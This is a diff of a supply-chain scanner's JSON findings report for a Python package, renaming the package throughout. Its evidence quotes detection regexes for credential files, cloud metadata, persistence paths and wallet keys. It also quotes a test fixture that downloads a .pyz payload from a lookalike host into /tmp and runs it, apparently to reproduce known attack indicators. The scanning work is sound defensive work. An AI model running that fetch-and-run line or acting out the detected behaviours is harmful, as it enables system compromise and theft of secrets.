@@ -717,127 +717,127 @@
       "evidence": "L156: return importlib.import_module(\".\" + module_name, self.__name__)"
     },
     {
-      "package": "unsloth-zoo",
+      "package": "tunelabs-zoo",
       "file": "scripts/scan_packages.py",
       "check": "Accesses cloud metadata/IMDS AND makes network calls",
       "severity": "CRITICAL",
       "evidence": "IMDS: L155: r\"|/latest/meta-data\" | L156: r\"|/metadata/instance\" | L157: r\"|/metadata/identity\"\nNetwork: L53: import urllib.request | L1757: req = urllib.request.Request(url, headers = {\"Accept\": \"application/json\"}) | L1758: with urllib.re"
     },
     {
-      "package": "unsloth-zoo",
+      "package": "tunelabs-zoo",
       "file": "scripts/scan_packages.py",
       "check": "Creates archive with sensitive data AND makes network calls",
       "severity": "CRITICAL",
       "evidence": "Archive: L1254: with tarfile.open(path, mode = \"r|*\") as tf:\nNetwork: L53: import urllib.request | L1757: req = urllib.request.Request(url, headers = {\"Accept\": \"application/json\"}) | L1758: with urllib.request.urlopen(req, timeout = 30) as"
     },
     {
-      "package": "unsloth-zoo",
+      "package": "tunelabs-zoo",
       "file": "scripts/scan_packages.py",
       "check": "Enumerates filesystem AND makes network calls",
       "severity": "CRITICAL",
       "evidence": "FS: L116: r\"|/etc/shadow|/etc/passwd\" | L256: r\"|/etc/shadow\" | L257: r\"|/etc/passwd\",\nNetwork: L53: import urllib.request | L1757: req = urllib.request.Request(url, headers = {\"Accept\": \"application/json\"}) | L1758: with urllib.request.url"
     },
     {
-      "package": "unsloth-zoo",
+      "package": "tunelabs-zoo",
       "file": "scripts/scan_packages.py",
       "check": "Installs persistence AND makes network calls (backdoor pattern)",
       "severity": "CRITICAL",
       "evidence": "Persist: L163: r\"/etc/systemd/\" | L166: r\"|/etc/cron\" | L169: r\"|/Library/LaunchDaemons\"\nNetwork: L53: import urllib.request | L1757: req = urllib.request.Request(url, headers = {\"Accept\": \"application/json\"}) | L1758: with urllib.request.u"
     },
     {
-      "package": "unsloth-zoo",
+      "package": "tunelabs-zoo",
       "file": "scripts/scan_packages.py",
       "check": "May-12 Shai-Hulud IOC string present in Python file",
       "severity": "CRITICAL",
       "evidence": "L353: r\"|With Love TeamPCP|We've been online over 2 hours)\","
     },
     {
-      "package": "unsloth-zoo",
+      "package": "tunelabs-zoo",
       "file": "scripts/scan_packages.py",
       "check": "Targets cryptocurrency wallets AND makes network calls",
       "severity": "CRITICAL",
       "evidence": "Crypto: L294: r\"|\\b(?:xprv|xpub|bc1|0x[a-fA-F0-9]{40})\\b\",\nNetwork: L53: import urllib.request | L1757: req = urllib.request.Request(url, headers = {\"Accept\": \"application/json\"}) | L1758: with urllib.request.urlopen(req, timeout = 30) as r"
     },
     {
-      "package": "unsloth-zoo",
+      "package": "tunelabs-zoo",
       "file": "scripts/scan_packages.py",
       "check": "Writes to /tmp and executes (staged dropper)",
       "severity": "CRITICAL",
       "evidence": "L308: r\"/tmp/\\S+.*(?:subprocess|os\\.system|os\\.popen|Popen|chmod.*\\+x)\","
     },
     {
-      "package": "unsloth-zoo",
+      "package": "tunelabs-zoo",
       "file": "tests/security/fixtures/_build.py",
       "check": "Creates archive with sensitive data AND makes network calls",
       "severity": "CRITICAL",
       "evidence": "Archive: L129: with tarfile.open(fileobj = inner, mode = \"w\") as tf:\nNetwork: L48: import urllib.request | L52: urllib.request.urlretrieve("
     },
     {
-      "package": "unsloth-zoo",
+      "package": "tunelabs-zoo",
       "file": "tests/security/fixtures/_build.py",
       "check": "May-12 Shai-Hulud IOC string present in Python file",
       "severity": "CRITICAL",
       "evidence": "L53: \"https://git-tanstack.com/transformers.pyz\", | L54: \"/tmp/transformers.pyz\", | L56: subprocess.run([\"python3\", \"/tmp/transformers.pyz\"], check=False)"
     },
     {
-      "package": "unsloth-zoo",
+      "package": "tunelabs-zoo",
       "file": "tests/security/fixtures/_build.py",
       "check": "Writes to /tmp and executes (staged dropper)",
       "severity": "CRITICAL",
       "evidence": "L54: \"/tmp/transformers.pyz\","
     },
     {
-      "package": "unsloth-zoo",
+      "package": "tunelabs-zoo",
       "file": "tests/security/test_scan_packages.py",
       "check": "May-12 Shai-Hulud IOC string present in Python file",
       "severity": "CRITICAL",
       "evidence": "L154: \"git-tanstack.com\", | L155: \"/tmp/transformers.pyz\", | L156: \"transformers.pyz\","
     },
     {
-      "package": "unsloth-zoo",
+      "package": "tunelabs-zoo",
       "file": "tests/security/test_scan_packages.py",
       "check": "Writes to /tmp and executes (staged dropper)",
       "severity": "CRITICAL",
       "evidence": "L155: \"/tmp/transformers.pyz\","
     },
     {
-      "package": "unsloth-zoo",
+      "package": "tunelabs-zoo",
       "file": "tests/test_convert_hf_to_gguf_patcher.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
       "evidence": "Env: L454: if os.environ.get(\"GITHUB_TOKEN\"): | L455: headers[\"Authorization\"] = f\"Bearer {os.environ['GITHUB_TOKEN']}\"\nNetwork: L458: r = requests.get(base_url + rel, timeout=15, headers=headers)"
     },
     {
-      "package": "unsloth-zoo",
+      "package": "tunelabs-zoo",
       "file": "tests/test_quantize_gguf_q2_k_l.py",
       "check": "Writes to /tmp and executes (staged dropper)",
       "severity": "CRITICAL",
       "evidence": "L67: input_gguf=\"/tmp/in.gguf\","
     },
     {
-      "package": "unsloth-zoo",
+      "package": "tunelabs-zoo",
       "file": "tests/test_upstream_pinned_symbols_transformers.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
       "evidence": "Env: L60: token = os.environ.get(\"GITHUB_TOKEN\") or os.environ.get(\"GH_TOKEN\")\nNetwork: L30: import urllib.request | L59: req = urllib.request.Request(url) | L64: with urllib.request.urlopen(req, timeout=15) as r:"
     },
     {
-      "package": "unsloth-zoo",
-      "file": "unsloth_zoo/device_type.py",
+      "package": "tunelabs-zoo",
+      "file": "tunelabs_zoo/device_type.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
       "evidence": "Env: L137: value = os.environ.get(key, \"\")\nNetwork: L37: import urllib.request | L82: request = urllib.request.Request( | L87: with urllib.request.urlopen(request, timeout = 2.5) as response:"
     },
     {
-      "package": "unsloth-zoo",
-      "file": "unsloth_zoo/llama_cpp.py",
+      "package": "tunelabs-zoo",
+      "file": "tunelabs_zoo/llama_cpp.py",
       "check": "Creates archive with sensitive data AND makes network calls",
       "severity": "CRITICAL",
       "evidence": "Archive: L847: with tarfile.open(archive_path, \"r:gz\") as archive:\nNetwork: L657: response = requests.get(url, timeout = timeout, headers = headers, stream = stream) | L1546: response = requests.get( | L2694: check = requests.get(llama_cpp_"
     },
     {
-      "package": "unsloth-zoo",
-      "file": "unsloth_zoo/llama_cpp.py",
+      "package": "tunelabs-zoo",
+      "file": "tunelabs_zoo/llama_cpp.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
       "evidence": "Env: L125: keynames = \"\\n\" + \"\\n\".join(os.environ.keys()) | L649: token = os.environ.get(\"GH_TOKEN\") or os.environ.get(\"GITHUB_TOKEN\")\nNetwork: L657: response = requests.get(url, timeout = timeout, headers = headers, stream = stream) | L154"
@@ -1256,64 +1256,64 @@
       "evidence": "Obfusc: L1435: compiled_code = compile(transformed_ast, filename=self.filename, mode='exec')\nExec: L1441: exec(compiled_code, fn_globals, local_namespace)"
     },
     {
-      "package": "unsloth-zoo",
+      "package": "tunelabs-zoo",
       "file": "scripts/scan_packages.py",
       "check": "exec/eval with payload hidden in a docstring/string",
       "severity": "HIGH",
       "evidence": "marshal/compile/obfuscation: L132: r\"|\\bbytearray\\s*\\(\\s*\\[.*?\\]\\s*\\)\"  # bytearray([104,101,...]) | L135: r\"|\\bgetattr\\s*\\(\\s*__builtins__\"  # getattr(__builtins__, ...)"
     },
     {
-      "package": "unsloth-zoo",
+      "package": "tunelabs-zoo",
       "file": "tests/test_compiler_dynamic_exec.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
       "evidence": "Obfusc: L126: code = compile(source, f\"<{entry_point}>\", \"exec\")\nExec: L134: exec(code, sandbox)"
     },
     {
-      "package": "unsloth-zoo",
+      "package": "tunelabs-zoo",
       "file": "tests/test_fused_forward_install.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
       "evidence": "Obfusc: L268: code = compile(src, fake_path, \"exec\")\nExec: L269: exec(code, namespace)"
     },
     {
-      "package": "unsloth-zoo",
+      "package": "tunelabs-zoo",
       "file": "tests/test_upstream_pinned_symbols_trl_vllm.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
-      "evidence": "Obfusc: L379: mod = __import__(modpath, fromlist=[\"Logprob\"])\nExec: L238: \"unsloth_zoo dispatch via `eval(f'trl.trainer.{trainer_file}.{name}')` breaks\""
+      "evidence": "Obfusc: L379: mod = __import__(modpath, fromlist=[\"Logprob\"])\nExec: L238: \"tunelabs_zoo dispatch via `eval(f'trl.trainer.{trainer_file}.{name}')` breaks\""
     },
     {
-      "package": "unsloth-zoo",
-      "file": "unsloth_zoo/compiler.py",
+      "package": "tunelabs-zoo",
+      "file": "tunelabs_zoo/compiler.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
       "evidence": "Obfusc: L1013: _mod = __import__(model_location, fromlist=items) | L4291: f\"   {chr(92)}{chr(92)}   /|    Num examples = {num_examples:,} | Num Epochs = {num_train_epochs:,} | Total steps = {max_steps:,}\\\\n\"\\\\ | L4292: f\"O^O/ {chr(92)}_/ {c"
     },
     {
-      "package": "unsloth-zoo",
-      "file": "unsloth_zoo/fused_losses/forward_install.py",
+      "package": "tunelabs-zoo",
+      "file": "tunelabs_zoo/fused_losses/forward_install.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
       "evidence": "Obfusc: L274: code = compile(new_src, synthetic_path, \"exec\")\nExec: L275: exec(code, ns)"
     },
     {
-      "package": "unsloth-zoo",
-      "file": "unsloth_zoo/mlx/loader.py",
+      "package": "tunelabs-zoo",
+      "file": "tunelabs_zoo/mlx/loader.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
       "evidence": "Obfusc: L1739: _mod = __import__(module_name, fromlist=[\"_\"])\nExec: L141: mx.eval(model.parameters()) | L1543: model.eval() | L2126: mx.eval(model.parameters())"
     },
     {
-      "package": "unsloth-zoo",
-      "file": "unsloth_zoo/patching_utils.py",
+      "package": "tunelabs-zoo",
+      "file": "tunelabs_zoo/patching_utils.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
       "evidence": "Obfusc: L706: compile(new_source, '<temp_patched>', 'exec')\nExec: L221: try:    exec(_try_compile_argument) | L226: try:    exec(_try_dynamo_argument) | L570: exec(\"from torch._dynamo.compiled_autograd import (\" + \", \".join(x for x in good_"
     },
     {
-      "package": "unsloth-zoo",
-      "file": "unsloth_zoo/saving_utils.py",
+      "package": "tunelabs-zoo",
+      "file": "tunelabs_zoo/saving_utils.py",
       "check": "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
       "severity": "HIGH",
       "evidence": "Obfusc: L3078: module = __import__('transformers', fromlist=[model_class_name])\nExec: L2960: exec(f\"from transformers.modeling_utils import ({', '.join(functions)})\", locals(), globals()) | L3006: exec(save_pretrained, globals(), functions)"
